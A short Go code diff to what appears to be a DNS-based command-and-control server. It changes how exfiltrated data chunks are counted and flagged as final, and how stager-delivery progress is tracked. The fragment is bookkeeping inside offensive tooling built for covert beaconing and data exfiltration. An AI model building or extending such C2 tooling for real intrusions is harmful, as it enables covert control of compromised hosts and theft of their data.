@@ -1033,12 +1033,8 @@ func (c2 *C2Manager) buildMetadataFromTracker(tracker *ExfilTagTracker, counter 
 		ChunkIndex:  counter,
 		TotalChunks: tracker.TotalChunks,
 	}
-	if tracker.TotalChunks == 0 {
-		meta.TotalChunks = counter
-	}
-	if meta.TotalChunks != 0 && counter == meta.TotalChunks {
-		meta.Flags |= ExfilFlagFinalChunk
-	}
+	// Don't try to guess TotalChunks from counter - it would be wrong
+	// Only set final flag based on explicit flags from the frame envelope
 	if flags&FrameEnvelopeFlagFinal != 0 {
 		meta.Flags |= ExfilFlagFinalChunk
 	}
@@ -2251,6 +2247,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 					session.LastActivity = time.Now()
 					session.DeliveredCount = chunkIndex + 1
 					session.LastChunkDelivered = chunkIndex
+					session.LastChunk = &chunkIndex // Update pointer for progress updater
 					c2.mutex.Unlock()
 
 					c2.logStagerProgress(session, chunkIndex, clientIP)
@@ -2293,6 +2290,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 				c2.mutex.Lock()
 				session.DeliveredCount = chunkIndex + 1
 				session.LastChunkDelivered = chunkIndex
+				session.LastChunk = &chunkIndex // Update pointer for progress updater
 				c2.mutex.Unlock()
 
 				c2.logStagerProgress(session, chunkIndex, clientIP)
@@ -2312,6 +2310,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			c2.mutex.Lock()
 			session.DeliveredCount = chunkIndex + 1
 			session.LastChunkDelivered = chunkIndex
+			session.LastChunk = &chunkIndex // Update pointer for progress updater
 			c2.mutex.Unlock()
 
 			c2.logStagerProgress(session, chunkIndex, clientIP)
